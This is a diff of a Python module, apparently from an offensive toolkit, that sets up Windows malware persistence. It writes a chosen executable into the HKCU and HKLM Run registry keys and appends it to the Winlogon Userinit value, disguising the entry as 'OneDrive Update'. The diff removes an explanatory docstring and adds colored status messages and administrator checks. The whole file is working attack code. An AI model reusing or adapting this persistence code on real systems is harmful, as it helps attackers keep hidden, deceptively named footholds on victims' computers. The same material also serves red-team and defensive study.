@@ -1,41 +1,76 @@
 """
-"Software\Microsoft\Windows\CurrentVersion\Run"
-	
-These are the most common startup locations for programs
-to install auto start from. By default these keys are not executed
-in Safe mode.
-
-"Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit"
-
-This key specifies what program should be launched right after a user
-logs into Windows. The default program for this key is
-C:\windows\system32\userinit.exe. Userinit.exe is a program that
-restores your profile, fonts, colors, etc for your user name. It is
-possible to add further programs that will launch from this key by
-separating the programs with a comma.
+Works from: Windows XP
+Fixed in: Unfixed
 """
 import os
+import ctypes
 import _winreg
+from colorama import init, Fore
+init(convert=True)
 
-def hkcu_auto_run_persistence(executable):
+def successBox():
+	return (Fore.GREEN + '[+]' + Fore.RESET)
+
+def errorBox():
+	return (Fore.RED + '[-]' + Fore.RESET)
+
+def infoBox():
+	return (Fore.CYAN + '[!]' + Fore.RESET)	
+
+def warningBox():
+	return (Fore.YELLOW + '[!]' + Fore.RESET)
+
+def HKCU_run_persistence(exe_path):
+	print " {} HKCU_run_persistence: Attempting to create HKCU run registry key".format(infoBox())
 	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run")
-		_winreg.SetValueEx(key,"OneDrive Update",0,_winreg.REG_SZ,executable)
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
+								os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
+		_winreg.SetValueEx(key,
+						"OneDrive Update",
+						0,
+						_winreg.REG_SZ,
+						exe_path)
+		print " {} HKCU_run_persistence: Successfully created HKCU run registry key".format(successBox())
 	except Exception as error:
+		print " {} HKCU_run_persistence: Unable to create HKCU run registry key".format(errorBox())
 		return False
 
-def hklm_auto_run_persistence(executable):
-	try:
-		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,"Software\Microsoft\Windows\CurrentVersion\Run")
-		_winreg.SetValueEx(key,"OneDrive Update",0,_winreg.REG_SZ,executable)
-	except Exception as error:
+def HKLM_run_persistence(exe_path):
+	print " {} HKLM_run_persistence: Attempting to create HKLM run registry key".format(infoBox())
+	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
+		print " {} HKLM_run_persistence: We are running as admin, we can proceed".format(infoBox())
+		try:
+			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
+									os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
+			_winreg.SetValueEx(key,
+							"OneDrive Update",
+							0,
+							_winreg.REG_SZ,
+							exe_path)
+			print " {} HKLM_run_persistence: Successfully created HKLM run registry key".format(successBox())
+		except Exception as error:
+			print " {} HKLM_run_persistence: Unable to create HKLM run registry key".format(errorBox())
+			return False
+	else:
+		print " {} HKLM_run_persistence: We are not admin, cannot proceed".format(errorBox())
 		return False
 
-def hklm_userinit_auto_run_persistence(executable):
-	payload = "c:\windows\system32\userinit.exe,{}".format(executable)
-	
-	try:
-		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
-		_winreg.SetValueEx(key,"Userinit",0,_winreg.REG_SZ,payload)
-	except Exception as error:
+def HKLM_userinit_persistence(exe_path):
+	print " {} HKLM_userinit_persistence: Attempting to create HKLM run registry key".format(infoBox())
+	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
+		print " {} HKLM_userinit_persistence: We are running as admin, we can proceed".format(infoBox())
+		try:
+			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
+									os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Winlogon"))
+			_winreg.SetValueEx(key,
+							"Userinit",
+							0,
+							_winreg.REG_SZ,
+							"c:\windows\system32\userinit.exe,{}".format(exe_path))
+			print " {} HKLM_userinit_persistence: Successfully created HKLM userinit registry key".format(successBox())				
+		except Exception as error:
+			print " {} HKLM_userinit_persistence: Unable to create HKLM userinit registry key".format(errorBox())
+			return False
+	else:
+		print " {} HKLM_userinit_persistence: We are not admin, cannot proceed".format(errorBox())
 		return False
